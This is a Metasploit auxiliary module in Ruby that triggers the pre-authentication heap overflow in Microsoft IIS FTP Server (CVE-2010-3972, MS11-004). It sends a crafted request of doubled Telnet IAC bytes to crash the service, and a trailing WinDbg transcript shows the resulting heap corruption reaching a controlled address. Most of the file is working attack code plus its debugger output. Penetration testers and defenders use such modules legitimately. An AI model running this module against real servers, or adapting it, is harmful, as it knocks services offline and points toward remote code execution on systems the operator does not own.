##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft IIS FTP Server Encoded Response Overflow Trigger',
      'Description'    => %q{
          This module triggers a heap overflow when processing a specially crafted
        FTP request containing Telnet IAC (0xff) bytes. When constructing the response,
        the Microsoft IIS FTP Service overflows the heap buffer with 0xff bytes.

        This issue can be triggered pre-auth and may in fact be explotiable for
        remote code execution.
      },
      'Author'         =>
        [
          'Matthew Bergin',  # Original discovery/disclosure
          'jduck'            # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2010-3972' ],
          [ 'OSVDB', '70167' ],
          [ 'BID', '45542' ],
          [ 'MSB', 'MS11-004' ],
          [ 'EDB', '15803' ],
          [ 'URL', 'http://blogs.technet.com/b/srd/archive/2010/12/22/assessing-an-iis-ftp-7-5-unauthenticated-denial-of-service-vulnerability.aspx' ]
        ],
      'DisclosureDate' => 'Dec 21 2010'))

    register_options(
      [
        Opt::RPORT(21)
      ], self.class)
  end


  def run
    connect

    banner = sock.get_once(-1, 10)
    print_status("banner: #{banner.strip}")

    buf = Rex::Text.pattern_create(1024)

    # the 0xff's must be doubled, the server will un-and-re-double them.
    ffs = "\xff" * (0x7e*2)

    # Continuing after the first exception sometimes leads to this being derefenced.
    buf[0,3] = [0xdeadbe00].pack('V')[1,3]

    buf[4,ffs.length] = ffs
    buf << "\r\n"

    sock.put(buf)

    disconnect
  rescue ::Rex::ConnectionError
  end

end

=begin

This transcript is from a vulnerable Win7 machine:

Processing initial command '$<script.wdbg'
0:012> $<script.wdbg
0:012> bp ftpsvc+3f360 ".printf \"buf @ 0x%x, len: 0x%x (end: 0x%x)\\n\", eax, ecx, (eax+ecx);g"
0:012> bp ftpsvc+3f382 ".printf \"extra len: 0x%x\\n\", edi;g"
0:012> bp ftpsvc+3f395 ".printf \"(0x%x+0x%x) 0x%x > (0x%x-0x%x) 0x%x ??\\n\", ecx, edi, ebx, poi(esi+14), poi(esi+8), edx;g"
0:012> bp ftpsvc+3f397
0:012> bp ftpsvc+3f39f "r @$t0 = ecx;g"
0:012> bp ftpsvc+3f3a4 ".printf \"allocated 0x%x bytes at 0x%x (end: 0x%x)\\n\", @$t0, eax, (eax+@$t0);g"
0:012> *bp ftpsvc+3f3c0 ".printf \"writing 0xff to 0x%x\\n\", eax;g"
0:012> *bp ftpsvc+3f3c6 ".printf \"writing 0x%x to 0x%x\\n\", (edx & 0xff), eax;g"
0:012> g
buf @ 0x97f81c, len: 0x1b (end: 0x97f837)
extra len: 0x0
buf @ 0x3e4ca0, len: 0x3a4 (end: 0x3e5044)
extra len: 0x7e
(0x3a4+0x7e) 0x422 > (0x422-0x0) 0x422 ??
Breakpoint 3 hit
eax=003e4ca0 ebx=00000422 ecx=000003a4 edx=00000422 esi=00dcfaf8 edi=0000007e
eip=6c63f397 esp=00dcfaac ebp=00dcfac0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ftpsvc!TELNET_STREAM_CONTEXT::OnSendData+0x49:
6c63f397 8b7df8          mov     edi,dword ptr [ebp-8] ss:0023:00dcfab8=00000000
0:007> g
(2f8.a40): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=003e50d0 ebx=00000000 ecx=ffffffff edx=003e4898 esi=003e4890 edi=002f0000
eip=778f30d7 esp=00dcf990 ebp=00dcfa70 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010297
ntdll!RtlpFreeHeap+0x4d6:
778f30d7 8b19            mov     ebx,dword ptr [ecx]  ds:0023:ffffffff=????????
0:007> g
(2f8.a40): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=003e4898 ebx=003e4c98 ecx=deadbe27 edx=ffffff41 esi=003e4890 edi=002f0000
eip=778f6030 esp=00dcf950 ebp=00dcf978 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
ntdll!RtlpCoalesceFreeBlocks+0x268:
778f6030 8b4904          mov     ecx,dword ptr [ecx+4] ds:0023:deadbe2b=????????

=end
